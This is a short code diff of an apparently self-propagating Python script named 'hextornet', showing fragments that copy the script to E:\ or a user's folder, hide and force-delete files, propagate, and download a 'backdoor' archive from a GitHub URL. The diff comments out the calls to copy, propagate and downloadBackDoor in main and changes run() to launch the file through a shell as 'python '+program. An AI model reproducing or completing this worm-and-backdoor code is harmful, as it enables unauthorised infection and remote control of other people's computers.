@@ -26,7 +26,6 @@ print(
 """
 	if(os.path.isdir("E:\\")):
 		dst = "E:" + "\\hextornet.py"
-
 	elif(os.path.isdir("C:\\")):
 		dst = "C:\\Users\\" + usr + "\\hextornet.py"
 	
@@ -82,7 +81,6 @@ def hide():
                         #to force deletion of a file set it to normal
                         win32api.SetFileAttributes(fname, win32con.FILE_ATTRIBUTE_NORMAL)
 			os.remove(fname)
-
 """
 
 def downloadBackDoor(url):
@@ -95,14 +93,14 @@ def downloadBackDoor(url):
 	print "finish downloading"
 
 def run(program):
-	process = sp.Popen(program, shell=True)
+	process = sp.Popen('python '+program, shell=True)
 	#process.wait()
 
 def main():
-	copy()
+	#copy()
 	#hide()
-	propagate()
-	downloadBackDoor("https://github.com/hectormtc/hextornet/archive/master.zip")
+	#propagate()
+	#downloadBackDoor("https://github.com/hectormtc/hextornet/archive/master.zip")
 
 if __name__ == "__main__":
 	main()
